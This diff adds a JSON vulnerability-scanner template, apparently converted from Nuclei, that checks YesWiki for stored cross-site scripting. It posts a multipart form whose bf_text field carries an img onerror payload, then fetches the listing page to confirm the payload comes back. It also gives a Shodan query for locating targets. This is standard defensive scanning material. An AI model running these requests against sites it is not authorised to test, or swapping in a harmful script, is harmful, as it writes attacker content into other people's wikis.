@@ -1,0 +1,132 @@
+{
+  "id": "yeswiki-stored-xss",
+  "name": "YesWiki - Stored Cross-Site Scripting",
+  "author": "arafatansari",
+  "severity": "HIGH",
+  "description": "YesWiki contains a stored contains a cross-site scripting vulnerability via the bf_text field when adding a new entry for Forum.\n",
+  "references": [
+    "https://huntr.dev/bounties/5f27a9b1-c092-47e2-8092-a81298a4b932/"
+  ],
+  "tags": [
+    "yeswiki",
+    "xss",
+    "stored-xss",
+    "huntr",
+    "intrusive"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.html:\"yeswiki\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-79",
+  "cvssScore": "7.2",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /?BazaR\u0026vue\u003dsaisir\u0026action\u003dsaisir_fiche\u0026id\u003d2 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryT8dS2PT0WtxACLyu\n\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"bf_titre\"\n\nblog\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"bf_text\"\n\n\"\u003e\u003cimg src\u003dx onerror\u003dconsole.log(123);\u003e\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"file\"; filename\u003d\"\"\nContent-Type: application/octet-stream\n\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"bf_description\"\n\nabcd\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"fichierbf_file\"; filename\u003d\"\"\nContent-Type: application/octet-stream\n\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"antispam\"\n\n1\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"id_typeannonce\"\n\n2\n------WebKitFormBoundaryT8dS2PT0WtxACLyu--\n",
+        "GET /?BazaR\u0026vue\u003dconsulter HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(header_2, \u0027text/html\u0027) \u0026\u0026 contains(header_2, \u0027YesWiki\u0027)",
+            "status_code_2 \u003d\u003d 200",
+            "contains(body_2, \u0027\u003e\u003cimg src\u003dx onerror\u003dconsole.log(123);\u003e\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "yeswiki-stored-xss",
+    "info": {
+      "name": "YesWiki - Stored Cross-Site Scripting",
+      "author": "arafatansari",
+      "severity": "high",
+      "description": "YesWiki contains a stored contains a cross-site scripting vulnerability via the bf_text field when adding a new entry for Forum.\n",
+      "reference": [
+        "https://huntr.dev/bounties/5f27a9b1-c092-47e2-8092-a81298a4b932/"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+        "cvss_score": "7.2",
+        "cwe_id": "CWE-79"
+      },
+      "metadata": {
+        "max_request": 2,
+        "shodan_query": "http.html:\"yeswiki\""
+      },
+      "tags": "yeswiki,xss,stored-xss,huntr,intrusive"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /?BazaR\u0026vue\u003dsaisir\u0026action\u003dsaisir_fiche\u0026id\u003d2 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryT8dS2PT0WtxACLyu\n\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"bf_titre\"\n\nblog\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"bf_text\"\n\n\"\u003e\u003cimg src\u003dx onerror\u003dconsole.log(123);\u003e\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"file\"; filename\u003d\"\"\nContent-Type: application/octet-stream\n\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"bf_description\"\n\nabcd\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"fichierbf_file\"; filename\u003d\"\"\nContent-Type: application/octet-stream\n\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"antispam\"\n\n1\n------WebKitFormBoundaryT8dS2PT0WtxACLyu\nContent-Disposition: form-data; name\u003d\"id_typeannonce\"\n\n2\n------WebKitFormBoundaryT8dS2PT0WtxACLyu--\n",
+          "GET /?BazaR\u0026vue\u003dconsulter HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(header_2, \u0027text/html\u0027) \u0026\u0026 contains(header_2, \u0027YesWiki\u0027)",
+              "status_code_2 \u003d\u003d 200",
+              "contains(body_2, \u0027\u003e\u003cimg src\u003dx onerror\u003dconsole.log(123);\u003e\u0027)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
